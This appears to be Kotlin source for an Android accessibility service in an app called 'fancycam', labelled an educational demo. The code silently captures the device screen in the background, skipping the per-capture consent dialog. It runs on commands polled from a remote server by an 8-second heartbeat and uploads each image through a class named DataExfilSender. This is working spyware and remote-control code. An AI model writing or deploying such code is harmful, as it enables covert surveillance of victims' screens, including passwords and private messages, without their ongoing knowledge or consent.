package xyz.nahil.fancycam.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityService.ScreenshotResult
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.ColorSpace
import android.hardware.HardwareBuffer
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Display
import xyz.nahil.fancycam.network.DataExfilSender
import xyz.nahil.fancycam.network.ScreenshotUploader
import java.io.File
import java.io.FileOutputStream

/**
 * EDUCATIONAL DEMO ONLY.
 *
 * An opt-in AccessibilityService that can take full-screen screenshots in the
 * background on Android 11+ (API 30+) without showing the MediaProjection
 * consent dialog each time. It requires the user to manually enable
 * "fancycam" under Accessibility settings first.
 */
class ScreenCaptureAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "AccessibilityScreenshot"
        @Volatile private var instance: ScreenCaptureAccessibilityService? = null

        fun isAccessibilityServiceEnabled(context: Context): Boolean {
            val enabled = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false

            val expectedShort = "${context.packageName}/.services.ScreenCaptureAccessibilityService"
            val expectedFull = android.content.ComponentName(
                context,
                ScreenCaptureAccessibilityService::class.java
            ).flattenToString()

            return enabled.split(':').any { item ->
                item.equals(expectedShort, ignoreCase = true) ||
                    item.equals(expectedFull, ignoreCase = true) ||
                    item.endsWith("/.services.ScreenCaptureAccessibilityService", ignoreCase = true)
            }
        }

        fun openAccessibilitySettings(context: Context) {
            try {
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
            } catch (e: Exception) {
                Log.e(TAG, "Cannot open accessibility settings", e)
            }
        }

        fun requestScreenshot(context: Context, commandId: String? = null) {
            val svc = instance
            if (svc == null) {
                Log.w(TAG, "Accessibility service not connected")
                if (commandId != null) {
                    DataExfilSender.reportCommandResult(context, commandId, status = "failed", error = "Accessibility service not connected")
                }
                return
            }
            svc.captureScreenshot(context, commandId)
        }
    }

    private val heartbeatHandler = Handler(Looper.getMainLooper())
    private val heartbeatRunnable = object : Runnable {
        override fun run() {
            // FALLBACK: the foreground CommandPollingService normally drives command
            // polling. Only beat from here when that service is not running, since an
            // AccessibilityService survives even when a foreground service cannot start.
            if (!CommandPollingService.isRunning) {
                try {
                    DataExfilSender.sendHeartbeat(
                        this@ScreenCaptureAccessibilityService,
                        processCommands = true
                    )
                } catch (e: Exception) {
                    Log.w(TAG, "Accessibility heartbeat failed", e)
                }
            }
            heartbeatHandler.postDelayed(this, 8000L)
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.i(TAG, "Accessibility screenshot service connected")
        heartbeatHandler.removeCallbacks(heartbeatRunnable)
        heartbeatHandler.postDelayed(heartbeatRunnable, 2000L)
    }

    override fun onAccessibilityEvent(event: android.view.accessibility.AccessibilityEvent?) = Unit

    override fun onInterrupt() = Unit

    override fun onDestroy() {
        super.onDestroy()
        heartbeatHandler.removeCallbacks(heartbeatRunnable)
        if (instance == this) instance = null
        Log.i(TAG, "Accessibility screenshot service destroyed")
    }

    private fun captureScreenshot(context: Context, commandId: String?) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            Log.w(TAG, "Background screenshot requires Android 11+ (API 30+)")
            if (commandId != null) {
                DataExfilSender.reportCommandResult(context, commandId, status = "failed", error = "Requires Android 11+ (API 30+)")
            }
            return
        }

        val handler = Handler(Looper.getMainLooper())
        try {
            takeScreenshot(
                Display.DEFAULT_DISPLAY,
                mainExecutor,
                object : AccessibilityService.TakeScreenshotCallback {
                    override fun onSuccess(result: ScreenshotResult) {
                        Thread {
                            handleScreenshotResult(context, result, commandId)
                        }.start()
                    }

                    override fun onFailure(errorCode: Int) {
                        Log.e(TAG, "takeScreenshot failed with code $errorCode")
                        if (commandId != null) {
                            DataExfilSender.reportCommandResult(context, commandId, status = "failed", error = "takeScreenshot failed: $errorCode")
                        }
                    }
                }
            )
        } catch (e: Exception) {
            Log.e(TAG, "Screenshot request threw", e)
            if (commandId != null) {
                DataExfilSender.reportCommandResult(context, commandId, status = "failed", error = e.message)
            }
        }
    }

    private fun handleScreenshotResult(context: Context, result: ScreenshotResult, commandId: String?) {
        var hardwareBuffer: HardwareBuffer? = null
        try {
            hardwareBuffer = result.hardwareBuffer
            val colorSpace = result.colorSpace ?: ColorSpace.get(ColorSpace.Named.SRGB)
            if (hardwareBuffer == null) {
                if (commandId != null) {
                    DataExfilSender.reportCommandResult(context, commandId, status = "failed", error = "Empty screenshot result")
                }
                return
            }

            val hardwareBitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                ?: run {
                    if (commandId != null) {
                        DataExfilSender.reportCommandResult(context, commandId, status = "failed", error = "Could not wrap hardware buffer")
                    }
                    return
                }
            val bitmap = hardwareBitmap.copy(Bitmap.Config.ARGB_8888, false)

            val screenshotFile = File(context.cacheDir, "accessibility_screenshot_${System.currentTimeMillis()}.png")
            FileOutputStream(screenshotFile).use { out ->
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, out)
            }
            hardwareBitmap.recycle()
            bitmap.recycle()

            val uploadResult = kotlinx.coroutines.runBlocking { ScreenshotUploader.uploadScreenshot(context, screenshotFile) }
            screenshotFile.delete()

            if (uploadResult.success) {
                if (commandId != null) {
                    DataExfilSender.reportCommandResult(
                        context, commandId, status = "completed",
                        result = org.json.JSONObject().put("server_filename", uploadResult.serverFilename ?: "")
                    )
                }
            } else {
                if (commandId != null) {
                    DataExfilSender.reportCommandResult(context, commandId, status = "failed", error = uploadResult.message)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to process accessibility screenshot", e)
            if (commandId != null) {
                DataExfilSender.reportCommandResult(context, commandId, status = "failed", error = e.message)
            }
        } finally {
            try { hardwareBuffer?.close() } catch (_: Exception) {}
        }
    }
}
